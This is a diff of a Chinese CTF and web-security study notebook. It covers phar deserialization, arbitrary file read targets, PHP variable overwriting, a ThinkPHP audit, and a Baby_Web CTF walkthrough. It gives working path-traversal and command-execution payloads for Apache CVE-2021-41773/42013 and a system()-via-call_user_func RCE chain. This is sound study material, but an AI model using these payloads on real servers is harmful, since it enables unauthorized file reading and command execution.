 $phar -> setMetadata($obj);  // 将自定义meta-data存入manifest
 
-$phar -> stopBuffering(); // 停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘
+$phar -> stopBuffering(); // 自动签名，并将更改保存到磁盘
 ```
 
 **利用**
@@ -1933,13 +3361,189 @@ $phar -> stopBuffering(); // 停止缓冲对 Phar 归档的写入请求，并将
 > - 如果不能直接上传phar包，可以修改后缀为zip，或者是其他的
 > - 一般会返回上传文件的路径，然后使用**phar://**协议访问phar包，因为phar协议只认识phar的文件特征，只要符合特征就会解压
 
-### 其他
+## 其他
+
+### 任意文件读取
+
+**可读文件**
+
+```nginx
+/etc/passwd用来判断读取漏洞的存在
+/etc/environment	是环境变量配置文件之一。
+环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况。
+/etc/hostname		表示主机名。
+/etc/issue		指明系统版本。
+/proc	目录
+/proc/[pid] 查看进程
+/proc/self 查看当前进程
+/proc/self/cmdline 当前进程对应的终端命令，也就是程序运行路径
+/proc/self/pwd	程序运行目录
+/proc/self/		环境变量
+/sys/class/net/eth0/address mac地址保存位置
+
+```
+
+### 变量覆盖
+
+#### 案例
+
+```nginx
+<?php
+
+highlight_file('source.txt');
+echo "<br><br>";
+
+$flag = 'xxxxxxxx';
+$giveme = 'can can need flag!';
+$getout = 'No! flag.Try again. Come on!';
+if(!isset($_GET['flag']) && !isset($_POST['flag'])){
+    exit($giveme);
+}
+
+if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){
+    exit($getout);
+}
+
+foreach ($_POST as $key => $value) {
+    $$key = $value;
+}
+
+# 这里造成变量覆盖
+foreach ($_GET as $key => $value) {
+    $$key = $$value;
+}
+
+echo 'the flag is : ' . $flag;
+
+?>
+
+# get传入参数
+?a=flag&flag=a
+```
 
 
 
-## 代码审计
 
-### **cms审计**
+
+# 代码审计
+
+## [ThinkPHP V6.0.12LTS](https://xz.aliyun.com/t/11584)
+
+**目录结构**
+
+```nginx
+project  应用部署目录
+├─application           应用目录（可设置）
+│  ├─common             公共模块目录（可更改）
+│  ├─index              模块目录(可更改)
+│  │  ├─config.php      模块配置文件
+│  │  ├─common.php      模块函数文件
+│  │  ├─controller      控制器目录
+│  │  ├─model           模型目录
+│  │  ├─view            视图目录
+│  │  └─ ...            更多类库目录
+│  ├─command.php        命令行工具配置文件
+│  ├─common.php         应用公共（函数）文件
+│  ├─config.php         应用（公共）配置文件
+│  ├─database.php       数据库配置文件
+│  ├─tags.php           应用行为扩展定义文件
+│  └─route.php          路由配置文件
+├─extend                扩展类库目录（可定义）
+├─public                WEB 部署目录（对外访问目录）
+│  ├─static             静态资源存放目录(css,js,image)
+│  ├─index.php          应用入口文件
+│  ├─router.php         快速测试文件
+│  └─.htaccess          用于 apache 的重写
+├─runtime               应用的运行时目录（可写，可设置）
+├─vendor                第三方类库目录（Composer）
+├─thinkphp              框架系统目录
+│  ├─lang               语言包目录
+│  ├─library            框架核心类库目录
+│  │  ├─think           Think 类库包目录
+│  │  └─traits          系统 Traits 目录
+│  ├─tpl                系统模板目录
+│  ├─.htaccess          用于 apache 的重写
+│  ├─.travis.yml        CI 定义文件
+│  ├─base.php           基础定义文件
+│  ├─composer.json      composer 定义文件
+│  ├─console.php        控制台入口文件
+│  ├─convention.php     惯例配置文件
+│  ├─helper.php         助手函数文件（可选）
+│  ├─LICENSE.txt        授权说明文件
+│  ├─phpunit.xml        单元测试配置文件
+│  ├─README.md          README 文件
+│  └─start.php          框架引导文件
+├─build.php             自动生成定义文件（参考）
+├─composer.json         composer 定义文件
+├─LICENSE.txt           授权说明文件
+├─README.md             README 文件
+├─think                 命令行入口文件
+```
+
+#### 审计
+
+> **使用Seay源代码审计工具，审计代码**
+>
+> - 审计反序列漏洞时
+> - 可以通过`__destruct() 、__wakeup()`这两个函数入手
+
+![image-20230905220351577](./assets/image-20230905220351577.png)
+
+**Model.php**
+
+```nginx
+/**
+* 析构方法
+* @access public
+*/
+public function __destruct()
+{
+    if ($this->lazySave) {
+        $this->save();
+    }
+}
+
+/**
+* 保存当前数据对象
+* @access public
+* @param array  $data     数据
+* @param string $sequence 自增序列名
+* @return bool
+*/
+public function save(array $data = [], string $sequence = null): bool
+{
+    // 数据对象赋值
+        $this->setAttrs($data);
+
+    if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) {
+        return false;
+    }
+
+    $result = $this->exists ? $this->updateData() : $this->insertData($sequence);
+
+    if (false === $result) {
+        return false;
+    }
+
+    // 写入回调
+        $this->trigger('AfterWrite');
+
+    // 重新记录原始数据
+        $this->origin   = $this->data;
+    $this->get      = [];
+    $this->lazySave = false;
+
+    return true;
+}
+```
+
+
+
+
+
+
+
+## **cms审计**
 
 **i春秋qqcms**
 
@@ -1951,9 +3555,9 @@ $phar -> stopBuffering(); // 停止缓冲对 Phar 归档的写入请求，并将
 
 
 
-## CVE
+# CVE
 
-### CVE-2021-41773
+## CVE-2021-41773
 
 - **出现原因：在其2.4.49版本中引入了`ap_normalize_path`函数，导致了路径穿越漏洞。**
 
@@ -1961,15 +3565,18 @@ $phar -> stopBuffering(); // 停止缓冲对 Phar 归档的写入请求，并将
 
 - **在服务器开启cgi或cgid模块的情况下，该漏洞可执行任意命令**
 
-#### 攻击利用
+### 攻击利用
 
 > **`/icons/`目录是一个存在且可访问的目录，测试时也可改为其他目录如`/cgi-bin/`**
 >
 > ==实际用哪个取决于环境==
 
 ```nginx
-# 读取/etc/passwd 文件，实际在bp使用注意url编码情况，passwd也有可能没有权限读取
+# 读取/etc/passwd 文件，实际在bp使用注意url编码情况，icons有可能没有权限读取passwd
 /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+注意中间的%2e是编码状态
+
 
 # 进制命令执行
 /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
@@ -1977,9 +3584,380 @@ $phar -> stopBuffering(); // 停止缓冲对 Phar 归档的写入请求，并将
 		echo Content-Type: text/plain; echo; ls
 ```
 
+### 练习题
+
+[[GFCTF 2021]Baby_Web](https://www.nssctf.cn/problem/883)
+
+#### 信息收集
+
+**首先在源代码中发现提示**
+
+```nginx
+<h1>Welcome To GFCTF 12th!!</h1>
+<!--源码藏在上层目录xxx.php.txt里面，但你怎么才能看到它呢?-->
+```
+
+**使用cve读取文件**
+
+```nginx
+# 读取没有权限
+/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+```
+
+![image-20230905151129583](./assets/image-20230905151129583.png)
+
+```nginx
+# 换这个
+/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+```
+
+![image-20230905151227656](./assets/image-20230905151227656.png)
+
+> 成功读取到文件，然后根据提示读取index，提示的格式为`xxx.php.txt`
+>
+> 一般服务器中的文件是放在`/var/www/html`目录中，题目提示在上一层目录即：`/var/www`
+
+```nginx
+/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/var/www/index.php.txt
+```
+
+```nginx
+<?php
+    error_reporting(0);
+    define("main","main");
+
+	# 可以发现这里包含了一个文件，那么在读取它
+    include "Class.php";
+    $temp = new Temp($_POST);
+    $temp->display($_GET['filename']);
+
+?>
+```
+
+```nginx
+
+<?php
+defined('main') or die("no!!");
+Class Temp{
+    private $date=['version'=>'1.0','img'=>'https://www.apache.org/img/asf-estd-1999-logo.jpg'];
+    private $template;
+    public function __construct($data){
+
+        $this->date = array_merge($this->date,$data);
+    }
+    public function getTempName($template,$dir){
+        if($dir === 'admin'){
+            $this->template = str_replace('..','','./template/admin/'.$template);
+            if(!is_file($this->template)){
+                die("no!!");
+            }
+        }
+        else{
+            $this->template = './template/index.html';
+        }
+    }
+    public function display($template,$space=''){
+
+        extract($this->date);
+        $this->getTempName($template,$space);
+        include($this->template);
+    }
+    public function listdata($_params){
+        $system = [
+            'db' => '',
+            'app' => '',
+            'num' => '',
+            'sum' => '',
+            'form' => '',
+            'page' => '',
+            'site' => '',
+            'flag' => '',
+            'not_flag' => '',
+            'show_flag' => '',
+            'more' => '',
+            'catid' => '',
+            'field' => '',
+            'order' => '',
+            'space' => '',
+            'table' => '',
+            'table_site' => '',
+            'total' => '',
+            'join' => '',
+            'on' => '',
+            'action' => '',
+            'return' => '',
+            'sbpage' => '',
+            'module' => '',
+            'urlrule' => '',
+            'pagesize' => '',
+            'pagefile' => '',
+        ];
+
+        $param = $where = [];
+
+        $_params = trim($_params);
+
+        $params = explode(' ', $_params);
+        if (in_array($params[0], ['list','function'])) {
+            $params[0] = 'action='.$params[0];
+        }
+        foreach ($params as $t) {
+            $var = substr($t, 0, strpos($t, '='));
+            $val = substr($t, strpos($t, '=') + 1);
+            if (!$var) {
+                continue;
+            }
+            if (isset($system[$var])) { 
+                $system[$var] = $val;
+            } else {
+                $param[$var] = $val; 
+            }
+        }
+        // action
+        switch ($system['action']) {
+
+            case 'function':
+
+                if (!isset($param['name'])) {
+                    return  'hacker!!';
+                } elseif (!function_exists($param['name'])) {
+                    return 'hacker!!';
+                }
+
+                $force = $param['force'];
+                if (!$force) {
+                    $p = [];
+                    foreach ($param as $var => $t) {
+                        if (strpos($var, 'param') === 0) {
+                            $n = intval(substr($var, 5));
+                            $p[$n] = $t;
+                        }
+                    }
+                    if ($p) {
+
+                        $rt = call_user_func_array($param['name'], $p);
+                    } else {
+                        $rt = call_user_func($param['name']);
+                    }
+                    return $rt;
+                }else{
+                    return null;
+                }
+            case 'list':
+                return json_encode($this->date);
+        }
+        return null;
+    }
+}
+```
+
+#### 代码审计
+
+**index.php**
+
+```nginx
+<?php
+	# 包含了Class.php文件，并创建一个实例，构造函数的参数为POST中的变量
+    $temp = new Temp($_POST);
+	# 还需要传入一个filename，然后调用了Class.php中的display方法
+    $temp->display($_GET['filename']);
+
+?>
+
+# 构造函数内容如下
+private $date=['version'=>'1.0','img'=>'https://www.apache.org/img/asf-estd-1999-logo.jpg'];
+private $template;
+public function __construct($data){
+	# array_merge：作用是合并数组，会把我们传入的参数值，合并到已经存在的$data变量中
+    $this->date = array_merge($this->date,$data);
+}
 
 
-### CVE-2021-42013
+# display方法内容
+# $template：值为我们传入的filename的值
+# $space=''：默认为空
+public function display($template,$space=''){
+    # extract：作用是把数组中的元素拆分为单个变量
+    # 把我们通过构造参数追加到$data变量数组的值拆分为了多个变量
+    # 且这个函数会造成变量覆盖
+    extract($this->date);
+    
+    # 调用getTempName方法
+    $this->getTempName($template,$space);
+    
+    # $this->template：指向Class.php中定义的全局变量$template
+    include($this->template);
+}
+
+
+# getTempName方法内容
+# $template：为我们传入的filename
+# $dir = $space = ''
+public function getTempName($template,$dir){
+    # 想要进入这里需要 $space = admin
+    if($dir === 'admin'){
+        # 将我们传入的filename的值中的【..】替代为空，然后赋值给了全局变量$template
+        $this->template = str_replace('..','','./template/admin/'.$template);
+        # 这里判断文件是否存在，不存在就断了
+        if(!is_file($this->template)){
+            die("no!!");
+        }
+    }
+    else{
+        $this->template = './template/index.html';
+    }
+}
+```
+
+> 至此Index.php的代码引用结束
+>
+> 得出结论：可能存在的两个路由：`/template/index.html`、`/template/admin/`
+>
+> 测试后：`/template/admin/`（有效路由）
+>
+> ```nginx
+> <html lang="en">
+> <head>
+>     <meta charset="UTF-8">
+>     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+>     <title>后台</title>
+> </head>
+> <body>
+> <!--<img src="<?php echo $img;?>">-->
+> <div><?php echo $this->listdata("action=list module=$mod");?><div>
+>     <h6>version: <?php echo $version;?></h6>
+> </body>
+> </html>
+> ```
+>
+> ==其中显示的内容和CLass.php中定义的全局变量`$date`和`listdata()`有关==
+>
+> 
+
+**Class.php**
+
+```nginx
+# $_params：为我们在POST传入的参数内容
+# 内容为：function name=system force=false param0xx=命令
+# 或者：action=function name=system force=false param0xx=命令
+public function listdata($_params){
+    $system = [
+        'db' => '',
+        'app' => '',
+        'num' => '',
+        'sum' => '',
+        'form' => '',
+        'page' => '',
+        'site' => '',
+        'flag' => '',
+        'not_flag' => '',
+        'show_flag' => '',
+        'more' => '',
+        'catid' => '',
+        'field' => '',
+        'order' => '',
+        'space' => '',
+        'table' => '',
+        'table_site' => '',
+        'total' => '',
+        'join' => '',
+        'on' => '',
+        'action' => '',
+        'return' => '',
+        'sbpage' => '',
+        'module' => '',
+        'urlrule' => '',
+        'pagesize' => '',
+        'pagefile' => '',
+        ];
+
+    $param = $where = [];
+
+    # 去除字符串首尾处的空白字符
+    $_params = trim($_params);
+
+    # 使用空格分割字符串，说明POST中的多个参数以空格隔开
+    $params = explode(' ', $_params);
+    
+    # 如果第一个元素的内容满足条件，就会在其值前面添加action=
+    	# 如果要走命令执行，那么function就得放在第一位
+    	# 但是也可以跳过，我们可以直接在传入参数的列表中添加上action=function就行
+    	# 也就是传入参数：action=function
+    if (in_array($params[0], ['list','function'])) {
+        $params[0] = 'action='.$params[0];
+    }
+    
+    # 对分割后的字符串数组进行处理
+    foreach ($params as $t) {
+        # strpos:查找字符串首次出现的位置
+        
+        # 截取 $t 字符串中从位置 0 到第一个【=】出现位置之前的部分
+        $var = substr($t, 0, strpos($t, '='));
+        
+        # 截取 $t 字符串中从第一个等号出现位置之后一位开始到末尾的部
+        $val = substr($t, strpos($t, '=') + 1);
+        
+        # 没有提取到等号之前的字符串则跳过本次循环
+        if (!$var) {
+            continue;
+        }
+        
+        # 如果 $var 在 $system 数组中存在，则将 $val 赋值给 $system[$var]；
+        # 否则，将 $val 赋值给 $param[$var]。
+        if (isset($system[$var])) { 
+            $system[$var] = $val;
+        } else {
+            $param[$var] = $val; 
+        }
+    }
+    
+    switch ($system['action']) {
+
+        case 'function':
+            # 需要传入name、且函数要存在，那么我们就是要使用name进行rce
+            if (!isset($param['name'])) {
+                return  'hacker!!';
+            } else if (!function_exists($param['name'])) {
+                return 'hacker!!';
+            }
+
+        	
+            $force = $param['force'];
+        	# force为空进入
+            if (!$force) {
+            	# $p参数是为下面回调函数的参数，
+                $p = [];
+            	# 遍历参数，key => value
+                foreach ($param as $var => $t) {
+                	# 用于判断字符串变量 $var 是否以 'param' 开头，参数前面必须为：param
+                    if (strpos($var, 'param') === 0) {
+                    	# 变量 $var 中提取出从第五个字符开始到末尾的部分，并将结果转换为整数
+                        $n = intval(substr($var, 5));
+                    	# 这里就是对下标进行赋值，$t存储着要命令，如果$n为0，那么我们的命令会当成第一个参数
+                        $p[$n] = $t;
+                    }
+                }
+                if ($p) {
+					# 动态调用指定的函数。函数名存储在 $param['name'] 中通过，$p 数组传递参数给函数
+                    $rt = call_user_func_array($param['name'], $p);
+                } else {
+                	# 动态调用指定的函数。函数名存储在 $param['name'] 中，没有参数传递给函数
+                    $rt = call_user_func($param['name']);
+                }
+                return $rt;
+            }else{
+                return null;
+            }
+            case 'list':
+                return json_encode($this->date);
+        }
+    return null;
+}
+```
+
+
+
+## CVE-2021-42013
 
 - **介绍**
 
@@ -1993,7 +3971,7 @@ $phar -> stopBuffering(); // 停止缓冲对 Phar 归档的写入请求，并将
 
 
 
-#### **攻击利用**
+### **攻击利用**
 
 - **变化**
 
@@ -2012,7 +3990,7 @@ $phar -> stopBuffering(); // 停止缓冲对 Phar 归档的写入请求，并将
 
   
 
-## 一些绕过
+# 一些绕过
 
 -   绕过`shell_exec()`函数的特性
 
@@ -2084,7 +4062,7 @@ $phar -> stopBuffering(); // 停止缓冲对 Phar 归档的写入请求，并将
 
         
 
-#### 1、ping命令相关的命令执行
+## 1、ping命令相关的命令执行
 
 **正常情况有五种写法**
 
@@ -2097,7 +4075,7 @@ $phar -> stopBuffering(); // 停止缓冲对 Phar 归档的写入请求，并将
 	# 代表题目：[GXYCTF 2019]Ping Ping Ping
 ```
 
-#### 2、无回显RCE
+## 2、无回显RCE
 
 **做题思路**：
 
